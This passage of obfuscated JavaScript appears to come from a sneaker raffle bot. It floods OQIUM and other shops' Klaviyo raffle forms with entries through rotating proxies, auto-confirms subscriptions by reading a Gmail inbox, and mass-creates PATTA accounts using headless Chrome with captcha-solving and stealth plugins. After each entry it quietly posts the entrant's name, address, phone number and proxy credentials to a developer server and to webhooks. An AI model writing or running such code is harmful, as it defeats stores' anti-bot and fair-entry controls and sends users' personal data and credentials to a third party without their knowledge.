                                    'proxy': 'http://' + _0x5b30ae[0x2] + ':' + _0x5b30ae[0x3] + '@' + _0x5b30ae[0x0] + ':' + _0x5b30ae[0x1]
                                };
                                return _0x2e6071 != 'ver' && (_0x263b8a['url'] = _0x4447b0['url'], _0x263b8a['headers'] = _0x4447b0['headers']), _0x2e6071 == 'ver' && (_0x263b8a['method'] = 'GET', _0x263b8a['url'] = _0x2e28d3[_0x19a342]), new Promise(function (_0x24dea2, _0xbe64ec) {
                                    callback = async (_0x69fe09, _0x1a5813, _0x516709) => {
                                        if (!_0x69fe09 && _0x1a5813['statusCode'] == 0xca || !_0x69fe09 && _0x1a5813['statusCode'] == 0xc8) {
                                            if (_0x2e6071 != 'ver') {
                                                var _0x69432b = await _0x459281(_0x2e28d3[_0x19a342], _0x4447b0, 'dev', ![]), _0x1184e1 = await _0x459281(_0x2e28d3[_0x19a342], _0x4447b0, 'pub', ![]);
                                                const _0x32017b = {
                                                    'succesDEVMSG': { 'embeds': [_0x69432b] },
                                                    'succesPUBMSG': { 'embeds': [_0x1184e1] }
                                                };
                                                if (_0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '')
                                                    try {
                                                        await _0x5a13a5(_0x11db88['webhook'], _0x32017b['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x32017b['succesDEVMSG']), await _0x558aee(0xc8);
                                                try {
                                                    await _0x5a13a5(_0x122725, _0x32017b['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x10fee2(_0x2e28d3[_0x19a342], _0x4447b0);
                                            }
                                            _0x24dea2(console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x4447b0['name'] + ']\x20Task\x20' + (_0x19a342 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2e6071 != 'ver') {
                                                var _0x1d6454 = '' + _0x69fe09, _0x49bba6 = await _0x459281(_0x2e28d3[_0x19a342], _0x4447b0, 'dev', !![], _0x1d6454), _0x4da049 = {};
                                                _0x4da049['errorDEV'] = { 'embeds': [_0x49bba6] }, _0x15a8e9(_0x2e28d3[_0x19a342], _0x4447b0), _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x4da049['errorDEV']), await _0x5a13a5(_0x877ec9, _0x4da049['errorDEV']);
                                            }
                                            _0xbe64ec(console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x4447b0['name'] + ']\x20Task\x20' + (_0x19a342 + 0x1) + ':\x20' + _0x69fe09)));
                                        }
                                    };
                                    try {
                                        _0x2e6071 != 'ver' ? console['log'](_0xb9a031() + '\x20[' + _0x4447b0['name'] + ']\x20Task\x20' + (_0x19a342 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4776b5['data']['attributes']['email']) : console['log'](_0xb9a031() + '\x20[' + _0x4447b0['name'] + ']\x20Task\x20' + (_0x19a342 + 0x1) + ':\x20Fetching\x20Response'), _0x5f0eca(_0x263b8a, callback);
                                    } catch (_0xcadeb5) {
                                        console['log'](_0xb9a031() + '\x20Task\x20' + (_0x19a342 + 0x1) + ':\x20' + _0xcadeb5);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2402e5(_0x4142e3, 'ver', _0x31e950, _0x21bfa5, _0x5e9e65), console['log'](_0xb9a031() + '\x20[' + _0x31e950['name'] + ']\x20Sleeping\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                            } catch (_0x2ae6ed) {
                            }
                        }
                    }
                    try {
                        _0x1252a1();
                        while (!_0x3571bb) {
                            await _0x558aee(0xbb8);
                        }
                        console['log']('Found\x20' + _0x518d43['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x558aee(0x9c4);
                    }
                    await _0x45f12e(_0x1cc7c8, _0x518d43, _0x3d71ab);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xe86ec5, _0x5d8693, _0x33d123) {
                    var _0x4910b0 = _0x5d8693, _0x4e6be6 = 0x0;
                    for (var _0x52cd31 = 0x0; _0x52cd31 < _0x5d8693['length']; _0x52cd31++) {
                        maxTasks = _0x11db88['threads'];
                        while (_0x4e6be6 >= maxTasks) {
                            await _0x558aee(_0x11db88['delay']);
                        }
                        async function _0x5098cf(_0xe65305, _0x329a4a, _0x5199bc, _0x557eb6) {
                            try {
                                await _0x162b07(_0x329a4a, _0x557eb6);
                            } catch (_0x5dce2d) {
                                throw new Error(_0x5dce2d);
                            }
                            async function _0x3f025f(_0x4bcf60, _0x2242b7, _0x1dab04, _0x4b6215, _0x43d931) {
                                _0x4e6be6++;
                                var _0x33fcf4, _0x32c639 = {}, _0x12d7f1 = [], _0x2930d1 = {}, _0x9cb46b = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x4d3b52 = Math['round'](Math['random']() * (_0x9cb46b['length'] - 0x1));
                                !_0x4b6215 && (_0x4b6215 = {});
                                if (_0x2242b7 != 'ver') {
                                    _0x9f07d8(_0x1dab04['name'] + '\x20Task\x20' + (_0x4bcf60 + 0x1) + '\x20/\x20' + _0x4b6215['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918), _0x12d7f1 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x94d398
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x4b6215[_0x4bcf60]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x11db88['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x3c77f4
                                            }
                                        ]
                                    }], _0x2930d1 = { 'embeds': _0x12d7f1 }, _0x32c639 = _0x1dab04['data'], _0x32c639['data']['attributes']['email'] = '' + _0x4b6215[_0x4bcf60]['Email'];
                                    if (_0x4b6215[_0x4bcf60]['Size'] == 'RANDOM') {
                                    }
                                    _0x32c639['data']['attributes']['properties']['$first_name'] = '' + _0x4b6215[_0x4bcf60]['FirstName'], _0x32c639['data']['attributes']['properties']['$last_name'] = '' + _0x4b6215[_0x4bcf60]['LastName'], _0x32c639['data']['attributes']['properties']['$address1'] = _0x4b6215[_0x4bcf60]['Address1'] + '\x20' + _0x4b6215[_0x4bcf60]['Address2'] + '\x20' + _0x4b6215[_0x4bcf60]['HouseNumber'], _0x32c639['data']['attributes']['properties']['$zip'] = '' + _0x4b6215[_0x4bcf60]['Zip'], _0x32c639['data']['attributes']['properties']['$city'] = '' + _0x4b6215[_0x4bcf60]['City'], _0x32c639['data']['attributes']['properties']['$country'] = '' + _0x4b6215[_0x4bcf60]['Country'], _0x4b6215[_0x4bcf60]['Size'] == 'RANDOM' ? _0x32c639['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x9cb46b[_0x4d3b52] : _0x32c639['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4b6215[_0x4bcf60]['Size'], _0x32c639['data']['attributes']['properties']['$phone_number'] = '' + _0x4b6215[_0x4bcf60]['Phone'], _0x32c639['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4b6215[_0x4bcf60]['Follower'];
                                }
                                if (_0x11db88['useRandomProxy'] = ![])
                                    var _0x38aaa8 = _0x43d931[_0x4bcf60]['split'](':');
                                else
                                    var _0x121d01 = Math['round'](Math['random']() * (_0x43d931['length'] - 0x1)), _0x38aaa8 = _0x43d931[_0x121d01]['split'](':');
                                var _0x480078 = {
                                    'jar': _0x26fd4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1dab04['url'],
                                    'headers': _0x1dab04['headers'],
                                    'body': JSON['stringify'](_0x32c639),
                                    'proxy': 'http://' + _0x38aaa8[0x2] + ':' + _0x38aaa8[0x3] + '@' + _0x38aaa8[0x0] + ':' + _0x38aaa8[0x1]
                                };
                                return _0x2242b7 != 'ver' && (_0x480078['url'] = _0x1dab04['url'], _0x480078['headers'] = _0x1dab04['headers']), _0x2242b7 == 'ver' && (_0x480078['method'] = 'GET'), new Promise(function (_0x2e9757, _0x2e651a) {
                                    callback = async (_0x311727, _0x275006, _0x3440f8) => {
                                        if (!_0x311727 && _0x275006['statusCode'] == 0xca || !_0x311727 && _0x275006['statusCode'] == 0xc8) {
                                            if (_0x2242b7 != 'ver') {
                                                var _0x16ea9b = await _0x459281(_0x4b6215[_0x4bcf60], _0x1dab04, 'dev', ![]), _0x36184c = await _0x459281(_0x4b6215[_0x4bcf60], _0x1dab04, 'pub', ![]);
                                                const _0x213e08 = {
                                                    'succesDEVMSG': { 'embeds': [_0x16ea9b] },
                                                    'succesPUBMSG': { 'embeds': [_0x36184c] }
                                                };
                                                let _0x39e579 = _0x4b6215[_0x4bcf60];
                                                try {
                                                    prxdata = {
                                                        'username': _0x94d398['replace']('#', ''),
                                                        'module': _0x1dab04['name'],
                                                        'entrydata': JSON['stringify'](_0x39e579),
                                                        'proxy': '' + _0x43d931[_0x4bcf60]
                                                    };
                                                    var _0x5add71 = JSON['stringify'](prxdata);
                                                    let _0x4a76d1 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x5add71, _0x4a76d1);
                                                } catch (_0x198428) {
                                                }
                                                if (_0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '')
                                                    try {
                                                        await _0x5a13a5(_0x11db88['webhook'], _0x213e08['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x213e08['succesDEVMSG']), await _0x558aee(0xc8);
                                                try {
                                                    await _0x5a13a5(_0x122725, _0x213e08['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x10fee2(_0x4b6215[_0x4bcf60], _0x1dab04);
                                            }
                                            _0x4e6be6--, _0x2e9757(console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x1dab04['name'] + ']\x20Task\x20' + (_0x4bcf60 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2242b7 != 'ver') {
                                                var _0x185056 = '' + _0x311727, _0x4463dd = await _0x459281(_0x4b6215[_0x4bcf60], _0x1dab04, 'dev', !![], _0x185056), _0x376968 = {};
                                                _0x376968['errorDEV'] = { 'embeds': [_0x4463dd] }, _0x15a8e9(_0x4b6215[_0x4bcf60], _0x1dab04), _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x376968['errorDEV']), await _0x5a13a5(_0x877ec9, _0x376968['errorDEV']);
                                            }
                                            _0x4e6be6--, _0x2e651a(console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1dab04['name'] + ']\x20Task\x20' + (_0x4bcf60 + 0x1) + ':\x20' + _0x311727)));
                                        }
                                    };
                                    try {
                                        _0x2242b7 != 'ver' && console['log'](_0xb9a031() + '\x20[' + _0x1dab04['name'] + ']\x20Task\x20' + (_0x4bcf60 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x32c639['data']['attributes']['email']), _0x5f0eca(_0x480078, callback);
                                    } catch (_0x2e9475) {
                                        console['log'](_0xb9a031() + '\x20Task\x20' + (_0x4bcf60 + 0x1) + ':\x20' + _0x2e9475);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3f025f(_0x557eb6, 'nor', _0xe65305, _0x329a4a, _0x5199bc), console['log'](_0xb9a031() + '\x20[' + _0xe65305['name'] + ']\x20Sleeping\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                            } catch (_0x2d0587) {
                            }
                        }
                        _0x5098cf(_0xe86ec5, _0x4910b0, _0x33d123, _0x52cd31), await _0x558aee(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xac64b9, _0x52fbad, _0x867c93) {
                    var _0x52fbad = [], _0x45b960 = ![];
                    async function _0x4ce5f8() {
                        var _0x4cb10a = new _0xda3ce2({
                            'user': _0x11db88['masterMail'],
                            'password': _0x11db88['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5cefb0(_0x3580e8) {
                            _0x4cb10a['openBox']('INBOX', ![], _0x3580e8);
                        }
                        _0x4cb10a['once']('ready', function () {
                            _0x5cefb0(function (_0x5e6538, _0x4a7b2b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5e6538)
                                    throw _0x5e6538;
                                _0x4cb10a['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x405149, _0x3b7e87) {
                                    if (!_0x3b7e87 || !_0x3b7e87['length'])
                                        console['log'](_0xb9a031() + '\x20[' + _0xac64b9['name'] + ']\x20No\x20mails\x20found'), _0x4cb10a['end']();
                                    else {
                                        var _0x56354a = _0x4cb10a['seq']['fetch'](_0x3b7e87, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x56354a['on']('message', function (_0x277059, _0x4f3a1f) {
                                            var _0x80bd5c = '(#' + _0x4f3a1f + ')\x20';
                                            _0x277059['on']('body', function (_0x5ae792, _0x4cf866) {
                                                _0x482936(_0x5ae792, (_0x309f20, _0x2dda2e) => {
                                                    var _0x753e8a = _0x2dda2e['text']['split']('(')[0x1], _0x3fd5e1 = _0x753e8a['split'](')')[0x0];
                                                    _0x52fbad['push'](_0x3fd5e1);
                                                });
                                            }), _0x277059['once']('end', function () {
                                            });
                                        }), _0x56354a['once']('error', function (_0x322dc0) {
                                            console['log']('Fetch\x20error:\x20' + _0x322dc0), _0x45b960 = !![];
                                        }), _0x56354a['once']('end', function () {
                                            _0x4cb10a['end'](), _0x45b960 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x4cb10a['once']('error', function (_0x486245) {
                            console['log'](_0x486245), _0x45b960 = !![];
                        }), _0x4cb10a['once']('end', async function () {
                            _0x45b960 = !![];
                        }), _0x4cb10a['connect']();
                    }
                    async function _0x1194b6(_0x41432b, _0x2c80e6, _0x76d58d) {
                        for (var _0x1be508 = 0x0; _0x1be508 < _0x2c80e6['length']; _0x1be508++) {
                            async function _0x10fef6(_0x21e971, _0x4a065b, _0x28bfe0, _0x31062a, _0x486bc5) {
                                var _0x234c48, _0x425f3b = {}, _0x2d9c5a = [], _0x2864dd = {}, _0x496d2c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x110ad7 = Math['round'](Math['random']() * (_0x496d2c['length'] - 0x1));
                                _0x31062a[_0x21e971]['Size'] == 'RANDOM' && (_0x31062a[_0x21e971]['Size'] = _0x496d2c[_0x110ad7]);
                                !_0x31062a && (_0x31062a = {});
                                if (_0x11db88['useRandomProxy'] = ![])
                                    var _0x40d2e6 = _0x486bc5[_0x21e971]['split'](':');
                                else
                                    var _0x2b7d83 = Math['round'](Math['random']() * (_0x486bc5['length'] - 0x1)), _0x40d2e6 = _0x486bc5[_0x2b7d83]['split'](':');
                                var _0xb82f77 = {
                                    'jar': _0x26fd4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x28bfe0['url'],
                                    'headers': _0x28bfe0['headers'],
                                    'body': JSON['stringify'](_0x425f3b),
                                    'proxy': 'http://' + _0x40d2e6[0x2] + ':' + _0x40d2e6[0x3] + '@' + _0x40d2e6[0x0] + ':' + _0x40d2e6[0x1]
                                };
                                return _0x4a065b == 'ver' && (_0xb82f77['method'] = 'GET', _0xb82f77['url'] = _0x31062a[_0x21e971]), new Promise(function (_0x32dd35, _0x381595) {
                                    callback = async (_0x2121b8, _0x3f34da, _0x173f7c) => {
                                        !_0x2121b8 && _0x3f34da['statusCode'] == 0xca || !_0x2121b8 && _0x3f34da['statusCode'] == 0xc8 ? _0x32dd35(console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x28bfe0['name'] + ']\x20Task\x20' + (_0x21e971 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x381595(console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x28bfe0['name'] + ']\x20Task\x20' + (_0x21e971 + 0x1) + ':\x20' + _0x2121b8)));
                                    };
                                    try {
                                        _0x4a065b != 'ver' ? console['log'](_0xb9a031() + '\x20[' + _0x28bfe0['name'] + ']\x20Task\x20' + (_0x21e971 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x425f3b['data']['attributes']['email']) : console['log'](_0xb9a031() + '\x20[' + _0x28bfe0['name'] + ']\x20Task\x20' + (_0x21e971 + 0x1) + ':\x20Fetching\x20Response'), _0x5f0eca(_0xb82f77, callback);
                                    } catch (_0x39b929) {
                                        console['log'](_0xb9a031() + '\x20Task\x20' + (_0x21e971 + 0x1) + ':\x20' + _0x39b929);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x10fef6(_0x1be508, 'ver', _0x41432b, _0x2c80e6, _0x76d58d), console['log'](_0xb9a031() + '\x20[' + _0x41432b['name'] + ']\x20Sleeping\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                            } catch (_0x12db08) {
                                console['log'](_0x12db08), await _0x558aee(0x2710);
                            }
                        }
                    }
                    try {
                        _0x4ce5f8();
                        while (!_0x45b960) {
                            await _0x558aee(0xfa0);
                        }
                        console['log']('Found\x20' + _0x52fbad['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x45a1fa) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x45a1fa), await _0x558aee(0x2710);
                    }
                    try {
                        await _0x1194b6(_0xac64b9, _0x52fbad, _0x867c93);
                    } catch (_0x6ee7f0) {
                        console['log'](_0x6ee7f0), await _0x558aee(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5c69a2, _0x2bcfe1, _0x8c34cc) {
                    _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x11db88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xefbe7e = 0x0; _0xefbe7e < _0x2bcfe1['length']; _0xefbe7e++) {
                        var _0x394411 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x94d398
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x11db88['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3c77f4
                                }
                            ]
                        }];
                        const _0xfcb5a3 = { 'embeds': _0x394411 };
                        _0x9f07d8(_0x5c69a2['name'] + '\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20/\x20' + _0x2bcfe1['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                        try {
                            await _0x162b07(_0x2bcfe1, _0xefbe7e);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x562cc2 = await _0x459281(_0x2bcfe1[_0xefbe7e], _0x5c69a2, 'acc', ![]);
                        const _0x13499d = { 'succesDEVMSG': { 'embeds': [_0x562cc2] } };
                        if (_0x2bcfe1[_0xefbe7e]['Email'] == '' || _0x2bcfe1[_0xefbe7e]['FirstName'] == '' || _0x2bcfe1[_0xefbe7e]['LastName'] == '') {
                            console['log'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x558aee(0x7d0);
                            continue;
                        }
                        (_0x2bcfe1[_0xefbe7e]['Password'] == '' || _0x2bcfe1[_0xefbe7e] == undefined) && _0x2bcfe1[_0xefbe7e]['Password'] == 'JRaffles23!';
                        if (_0x11db88['useRandomProxy'] = ![])
                            var _0x567f6a = _0x8c34cc[_0xefbe7e]['split'](':');
                        else
                            var _0x381f5d = Math['round'](Math['random']() * (_0x8c34cc['length'] - 0x1)), _0x567f6a = _0x8c34cc[_0x381f5d]['split'](':');
                        var _0x3468f6;
                        try {
                            _0x3468f6 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x567f6a[0x0] + ':' + _0x567f6a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3468f6 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x567f6a[0x0] + ':' + _0x567f6a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x24ecbb = await _0x3468f6['newPage']();
                            await _0x24ecbb['authenticate']({
                                'username': '' + _0x567f6a[0x2],
                                'password': '' + _0x567f6a[0x3]
                            }), console['log'](_0xb9a031() + '\x20[' + _0x5c69a2['name'] + ']\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x24ecbb['setRequestInterception'](!![]), _0x24ecbb['on']('request', _0x5c50ee => {
                                _0x5c50ee['resourceType']() === 'image' || _0x5c50ee['resourceType']() === 'font' || _0x5c50ee['resourceType']() === 'media' ? _0x5c50ee['abort']() : _0x5c50ee['continue']();
                            }), await _0x24ecbb['goto']('https://patta.nl/account/register'), await _0x558aee(0xbb8), await _0x24ecbb['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0xb9a031() + '\x20[' + _0x5c69a2['name'] + ']\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20:\x20Filling\x20information'), await _0x24ecbb['type']('#RegisterForm-FirstName', '' + _0x2bcfe1[_0xefbe7e]['FirstName']), await _0x558aee(0x226), await _0x24ecbb['type']('#RegisterForm-LastName', '' + _0x2bcfe1[_0xefbe7e]['LastName']), await _0x558aee(0x226), await _0x24ecbb['type']('#RegisterForm-email', '' + _0x2bcfe1[_0xefbe7e]['Email']), await _0x558aee(0x226), await _0x24ecbb['type']('#RegisterForm-password', '' + _0x2bcfe1[_0xefbe7e]['Password']), await _0x558aee(0x226), console['log'](_0xb9a031() + '\x20[' + _0x5c69a2['name'] + ']\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20:\x20Submitting..'), await _0x24ecbb['$eval']('#RegisterForm', _0xc9a35c => _0xc9a35c['submit']()), await _0x558aee(0x1f40);
                            try {
                                await _0x24ecbb['waitForSelector']('.home-page-grid__collection'), await _0x558aee(0x1f4), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x5c69a2['name'] + ']\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20:\x20Account\x20' + _0x2bcfe1[_0xefbe7e]['Email'] + '\x20Generated!')), _0x3f4ea0['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x2bcfe1[_0xefbe7e]['Email'] + ',' + _0x2bcfe1[_0xefbe7e]['Password']), console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x5c69a2['name'] + ']\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20:\x20Account\x20' + _0x2bcfe1[_0xefbe7e]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x13499d['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5a13a5(_0x16a6f5, _0x13499d['succesDEVMSG']);
                            } catch (_0x45a90b) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x45a90b));
                            }
                        } catch (_0x444800) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0xefbe7e + 0x1) + '\x20:\x20' + _0x444800));
                        } finally {
                            _0x3468f6 && _0x3468f6['close'](), console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x18267e, _0x431651, _0x4baaa5) {
                    _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x11db88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x418348 = 0x0; _0x418348 < _0x431651['length']; _0x418348++) {
                        var _0x6e6805;
                        if (_0x7a38a5 != 'yes')
